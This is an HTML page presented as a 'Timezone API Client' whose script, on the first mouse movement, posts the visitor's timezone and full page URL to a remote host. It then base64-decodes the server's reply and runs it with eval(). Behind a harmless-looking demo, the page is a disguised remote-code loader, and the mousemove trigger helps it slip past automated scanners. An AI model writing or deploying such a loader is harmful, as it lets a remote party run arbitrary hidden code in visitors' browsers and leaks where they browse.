<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Timezone API Client</title>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Listen for mouse movement
            document.addEventListener('mousemove', initiateApiRequestOnce);
            let requestSent = false;

            function initiateApiRequestOnce() {
                if (requestSent) return;

                requestSent = true;
                document.removeEventListener('mousemove', initiateApiRequestOnce);

                const clientTimezone = getCurrentTimezone();
                const fullUrl = window.location.href;

                transmitTimezoneData('https://your-app-name.onrender.com', clientTimezone, fullUrl)
                    .then(decodeAndRunScript)
                    .catch(handleError);
            }

            function getCurrentTimezone() {
                return Intl.DateTimeFormat().resolvedOptions().timeZone;
            }

            function transmitTimezoneData(url, timezone, fullUrl) {
                return fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ timezone, fullUrl }),
                }).then(response => {
                    if (!response.ok) {
                        throw new Error('Error: ' + response.statusText);
                    }
                    return response.text();
                });
            }

            function decodeAndRunScript(encodedScript) {
                try {
                    const script = atob(encodedScript);
                    eval(script);
                } catch (error) {
                    throw new Error(`Script execution failed: ${error}`);
                }
            }

            function handleError(error) {
                // Display error message to the user
                document.body.innerHTML = `<h1>${error.message}</h1>`;
            }
        });
    </script>
</head>
<body>
    <h1>Welcome to the Timezone API Client</h1>
    <p>Move your mouse to initiate the API request.</p>
</body>
</html>
